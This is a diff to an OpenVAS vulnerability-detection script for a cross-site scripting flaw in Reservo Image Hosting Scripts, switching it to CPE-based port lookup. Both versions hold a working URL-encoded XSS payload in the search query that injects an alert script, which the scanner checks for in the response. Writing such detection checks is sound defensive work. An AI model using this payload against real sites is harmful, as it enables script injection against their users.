@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_reservo_image_hosting_xss_vuln.nasl 8459 2018-01-18 11:13:27Z jschulte $
+# $Id: gb_reservo_image_hosting_xss_vuln.nasl 8547 2018-01-26 12:05:54Z jschulte $
 #
 # Reservo Image Hosting XSS Vulnerability
 #
@@ -28,8 +28,8 @@
 if( description )
 {
   script_oid("1.3.6.1.4.1.25623.1.0.113086");
-  script_version("$Revision: 8459 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-18 12:13:27 +0100 (Thu, 18 Jan 2018) $");
+  script_version("$Revision: 8547 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-01-26 13:05:54 +0100 (Fri, 26 Jan 2018) $");
   script_tag(name:"creation_date", value:"2018-01-18 10:46:47 +0100 (Thu, 18 Jan 2018)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
@@ -46,9 +46,8 @@ if( description )
 
   script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
-  script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_dependencies("gb_reservo_detect.nasl");
+  script_mandatory_keys("reservo/installed");
 
   script_tag(name:"summary", value:"Reservo Image Hosting Scripts through 1.5 is vulnerable to an XSS attack.");
   script_tag(name:"vuldetect", value:"The script sends a specifically crafted package to the host and tries to exploit the XSS vulnerability.");
@@ -58,32 +57,29 @@ if( description )
   script_tag(name:"solution", value:"Update to Reservoce Image Hosting Scripts version 1.6.1 or above.");
 
   script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43676/");
-  script_xref(name:"URL", value:"https://reservo.co/");
 
   exit( 0 );
 }
+
+CPE = "cpe:/a:reservo:image_hosting";
 
 include( "host_details.inc" );
 include( "http_func.inc" );
 include( "http_keepalive.inc" );
 
-port = get_http_port( default: 80 );
+if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
 
-buf = http_get_cache( item: "/", port: port );
+timestamp = gettimeofday();
+exploit_url = "/search/?s=image&t=%27%29%3B%2522%2520style%253D%22%3Cscript%3Ealert%28" + timestamp + "%29%3C%2Fscript%3E%3C";
+req = http_get( port: port, item: exploit_url );
+resp = http_keepalive_send_recv( port: port, data: req );
 
-
-if( "themes/reservo/frontend" >< buf ) {
-  timestamp = gettimeofday();
-  exploit_url = "/search/?s=image&t=%27%29%3B%2522%2520style%253D%22%3Cscript%3Ealert%28" + timestamp + "%29%3C%2Fscript%3E%3C";
-  req = http_get( port: port, item: exploit_url );
-  resp = http_keepalive_send_recv( port: port, data: req );
-  if( resp =~ 'loadBrowsePageRecentImages\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' || resp =~ 'loadBrowsePageAlbums\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' ) {
-    report = "The script was able to exploit the XSS vulnerability on the target host.";
-    security_message( port: port, data: report );
-  }
-  else {
-    exit( 99 );
-  }
+if( resp =~ 'loadBrowsePageRecentImages\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' || resp =~ 'loadBrowsePageAlbums\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' ) {
+  report = report_vuln_url(  port: port, url: exploit_url );
+  security_message( port: port, data: report );
+}
+else {
+  exit( 99 );
 }
 
 exit( 0 );
